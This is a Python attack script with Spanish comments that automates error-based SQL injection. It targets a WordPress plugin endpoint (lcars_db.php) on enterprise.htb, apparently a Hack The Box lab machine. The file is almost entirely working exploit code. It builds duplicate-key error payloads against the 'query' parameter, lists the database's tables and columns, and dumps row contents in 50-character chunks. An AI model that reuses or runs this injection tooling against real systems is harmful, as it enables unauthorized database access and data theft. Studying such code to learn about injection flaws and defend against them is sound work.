#!/usr/bin/python3

import requests
import string
import signal
import time
import sys
import re
from pwn import *

class Color:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    WHITE = '\033[97m'
    RED = '\033[91m'
    END = '\033[0m'

# Ctrl + C
def def_handler(sig, frame):
    print(Color.RED + "\n✘ Interrupción, saliendo...\n" + Color.END)
    exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) == 1:
    print(Color.BLUE + "\n[!] Usage: python3 " + sys.argv[0] + " <database>\n" + Color.END)
    exit(0)

def extract_tables(db_name):
    result = ""
    db_name_hex = db_name.encode('utf-8').hex()

    # Por si existe 100 tablas
    for table_position in range(0,100):
        payload = "(SELECT 8350 FROM(SELECT COUNT(*),CONCAT(0x5441424C45,(SELECT MID((IFNULL(CAST(table_name AS NCHAR),0x20)),1,50) FROM "
        payload += "INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x%s) LIMIT %d,1),0x5441424C45,FLOOR(RAND(0)*2))x " % (db_name_hex, table_position)
        payload += "FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)nada)"

        data_get = {"query" : "1 or " + payload}
        p2.status(Color.BLUE + data_get["query"] + Color.END)
        r = session.get(url, params=data_get)

        if "Duplicate" not in r.text:
            break

        p3 = log.progress(Color.BLUE + "Tabla [%d]" % (table_position) + Color.END)

        result += re.findall(r'E(.*?)T', r.text)[0]
        p3.success(Color.WHITE + result + Color.END)
        result = ""

    print(Color.BLUE + "\nAhora puedes agregar alguna de las tablas como parametro para listar sus columnas\n" + Color.END)

def extract_columns(db_name, table_name):
    result = ""

    db_name_hex = db_name.encode('utf-8').hex()
    table_name_hex = table_name.encode('utf-8').hex()

    # Por si existen 100 columnas
    for col_position in range(0,100):
        payload = "(SELECT 8350 FROM(SELECT COUNT(*),CONCAT(0x5441424C45,(SELECT MID((IFNULL(CAST(column_name AS NCHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.COLUMNS "
        payload += "WHERE table_schema IN (0x%s) AND table_name IN (0x%s) LIMIT %d,1),0x5441424C45,FLOOR(RAND(0)*2))x " % (db_name_hex, table_name_hex, col_position)
        payload += "FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)nada)"

        data_get = {"query" : "1 or " + payload}
        p2.status(Color.BLUE + data_get["query"] + Color.END)
        r = session.get(url, params=data_get)

        if "Duplicate" not in r.text:
            break

        p3 = log.progress(Color.BLUE + "Columna [%d]" % (col_position) + Color.END)

        result += re.findall(r'E(.*?)T', r.text)[0]
        p3.success(Color.WHITE + result + Color.END)
        result = ""

    print(Color.BLUE + "\nAhora puedes agregar cualquier columna para listar su información\n" + Color.END)

def extract_data(table_name, column_name):
    result = ""

    # Por si hay 100 filas con data
    for row_position in range(0,100):
        cont_i = 1
        cont_f = 50
        # Proceso de substring cada 50 caracteres (ya que si se pone un numero más grande empiezan a verse problemas), repetirlo 10 veces, osea 451 (inicia en 1, no en 50)
        # i.e: 1,50 primero, despues 51,50, despues 101,50...
        for sub_position in range(10):
            payload = "(SELECT 8350 FROM(SELECT COUNT(*),CONCAT(0x5441424C45,(SELECT "
            payload += "MID((IFNULL(CAST(%s AS NCHAR),0x20)),%d,%d) FROM %s.%s " % (column_name, cont_i, cont_f, db_name, table_name)
            payload += "LIMIT %d,1),0x5441424C45,FLOOR(RAND(0)*2))x " % (row_position)
            payload += "FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)nada)"

            data_get = {"query" : "1 or " + payload}
            p2.status(Color.BLUE + data_get["query"] + Color.END)
            r = session.get(url, params=data_get)

            if "Duplicate" not in r.text:
                break

            # Extraemos la data de la respuesta que esta entre ABLE y TABL. Ya que alguna llega con saltos de linea y no es tomada, debemos tranformar toda la respuesta en un array
            # Ahí buscamos la cadena TABLE1 (final de nuestra busqueda) y extraemos la posicion del array donde esta.
            # Simplemente indicamos que tome desde la posicion 7 (siempre esta el inicio de nuestra cadena "TABLE") hasta la posicion que encontramos antes+1 (para que en caso de que 
            #  TABLE1 tenga contenido antes, lo extraiga.
            # Y tomamos esa data extraiga para obtener toda la cadena de informacion que hay desde ABLE a TABL, con esto ya tenemos todo asi llegue con saltos de linea.
            try:
                data = ""
                # Array
                response = r.text.split()
                # Buscamos TABLE1 y extraemos su posicion.
                id_found = [item_res for item_res in range(len(response)) if "TABLE1" in response[item_res]][0]

                # Obtenemos de TABLE a TABLE1 todo lo que esta entre ellos.
                for set_data in range(7, id_found+1):
                    data += response[set_data] + " "

                # Vamos almacenando por cada substring
                result += re.findall(r'ABLE(.*?)TABL', data)[0]

                if result == "":
                    break
            except IndexError:
                break

            # Aumentamos la posicion en la que se mueve cada 50 caracteres
            cont_i += cont_f

        if "Duplicate" not in r.text:
            break

        p3 = log.progress(Color.BLUE + "[%d]" % (row_position) + Color.END)

        p3.success(Color.WHITE + result + Color.END)
        result = ""

url = "http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php"
session = requests.Session()

if len(sys.argv) == 2:
    db_name = sys.argv[1]

    p1 = log.progress(Color.BLUE + "Extrayendo tablas de la base de datos %s" % (db_name) + Color.END)
    p2 = log.progress(Color.BLUE + "Payload" + Color.END)
    print("\n")

    extract_tables(db_name)

    print(Color.WHITE + "[!] Usage: python3 " + sys.argv[0] + " " + sys.argv[1] + " <table_name>\n" + Color.END)

elif len(sys.argv) == 3:
    db_name = sys.argv[1]
    table_name = sys.argv[2]

    p1 = log.progress(Color.BLUE + "Extrayendo columnas de la tabla %s" % (table_name) + Color.END)
    p2 = log.progress(Color.BLUE + "Payload" + Color.END)
    print("\n")

    extract_columns(db_name, table_name)

    print(Color.WHITE + "[!] Usage: python3 " + sys.argv[0] + " " + sys.argv[1] + " " + sys.argv[2] + " <column_name>\n" + Color.END)

elif len(sys.argv) == 4:
    db_name = sys.argv[1]
    table_name = sys.argv[2]
    column_name = sys.argv[3]

    p1 = log.progress(Color.BLUE + "Info columna %s - tabla %s" % (column_name, table_name) + Color.END)
    p2 = log.progress(Color.BLUE + "Payload" + Color.END)
    print("\n")

    extract_data(table_name, column_name)

    print(Color.YELLOW + "\nk3Ep br3ak1n6 4anYyyu...\n" + Color.END)

p1.success(Color.WHITE + "d0Ne" + Color.END)
p2.success(Color.WHITE + "d0Ne" + Color.END)
